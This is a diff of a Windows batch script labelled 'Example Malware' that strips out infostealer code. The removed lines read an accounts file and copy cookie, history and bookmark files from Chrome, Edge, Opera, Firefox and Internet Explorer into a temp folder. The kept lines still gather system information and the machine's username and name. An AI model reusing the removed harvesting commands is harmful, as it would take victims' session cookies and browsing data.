@@ -1,39 +1,10 @@
-rem Read the contents of accounts.json
-set "accounts_json="
-for /F "usebackq delims=" %%G in ("%accountFile%") do (
-    set "accounts_json=!accounts_json!%%G"
-)
+rem Example Malware -- Does not do anything Malicious
 
 rem Create a text file with computer information
 echo Computer Information>%tempDir%\computer_info.txt
 echo.>>%tempDir%\computer_info.txt
 systeminfo>>"%tempDir%\computer_info.txt"
 
-rem Save PC username, PC name, IPv4, IPv6 addresses, MAC address, execution time, product key, accounts.json, and Google Maps link to data.txt
+rem Save PC username, PC name to data.txt
 echo :computer: PC Username: %username%>%tempDir%\data.txt
 echo :desktop: PC Name: %pcname%>>%tempDir%\data.txt
-echo :globe_with_meridians: IPv4 Address: %ipv4%>>%tempDir%\data.txt
-echo :globe_with_meridians: IPv6 Address: %ipv6%>>%tempDir%\data.txt
-echo Accounts.json Contents:>>%tempDir%\data.txt
-echo %accounts_json%>>%tempDir%\data.txt
-
-rem Copy browser-related files to the temporary directory (You can add other necessary files here)
-copy "%localappdata%\Google\Chrome\User Data\Default\Cookies" "%tempDir%\Chrome_Cookies.txt"
-copy "%localappdata%\Google\Chrome\User Data\Default\History" "%tempDir%\Chrome_History.txt"
-copy "%localappdata%\Google\Chrome\User Data\Default\Bookmarks" "%tempDir%\Chrome_Bookmarks.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Cookies" "%tempDir%\MicrosoftEdge_Cookies.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\History" "%tempDir%\MicrosoftEdge_History.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Favorites\*.url" "%tempDir%\MicrosoftEdge_Bookmarks.txt"
-copy "%APPDATA%\Opera Software\Opera GX Stable\Cookies" "%tempDir%\OperaGX_Cookies.txt"
-copy "%APPDATA%\Opera Software\Opera GX Stable\History" "%tempDir%\OperaGX_History.txt"
-copy "%APPDATA%\Opera Software\Opera GX Stable\Bookmarks" "%tempDir%\OperaGX_Bookmarks.txt"
-copy "%APPDATA%\Opera Software\Opera Stable\Cookies" "%tempDir%\Opera_Cookies.txt"
-copy "%APPDATA%\Opera Software\Opera Stable\History" "%tempDir%\Opera_History.txt"
-copy "%APPDATA%\Opera Software\Opera Stable\Bookmarks" "%tempDir%\Opera_Bookmarks.txt"
-copy "%userprofile%\Favorites\*.url" "%tempDir%\InternetExplorer_Bookmarks.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Default\Cookies" "%tempDir%\Edge_Cookies.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%tempDir%\Edge_History.txt"
-copy "%localappdata%\Microsoft\Edge\User Data\Default\Favorites\*.url" "%tempDir%\Edge_Bookmarks.txt"
-copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" "%tempDir%\Firefox_Cookies.txt"
-copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\places.sqlite" "%tempDir%\Firefox_History.txt"
-copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\places.sqlite" "%tempDir%\Firefox_Bookmarks.txt"
